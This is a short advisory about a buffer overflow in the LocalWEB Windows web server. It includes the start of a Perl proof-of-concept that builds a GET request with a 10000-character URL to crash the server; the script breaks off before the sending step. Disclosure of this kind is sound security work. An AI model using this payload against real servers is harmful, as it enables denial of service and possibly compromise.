LocalWEB is a freeware HTTP server for the Windows suite of operating systems. Certain versions of this software are vulnerable to a remotely exploitable buffer overflow attack. This attack can instrumented by sending the web server (via port 80) a malformed URL. The net result is a denial of service, however a remotely exploitable buffer overflow leading to a system compromise has not been ruled out.

# Malformed GET URL request DoS

$foo = "A"; # this is the NOP
$number = "10000"; # this is the total number of NOP
$data .= $foo x $number; # result of $foo times $number
$serv = $args{s}; # remote server
$port = 80; # remote port, default is 80
$buf = "GET /$data HTTP/1.0\r\n\r\n"; # issue this response to the
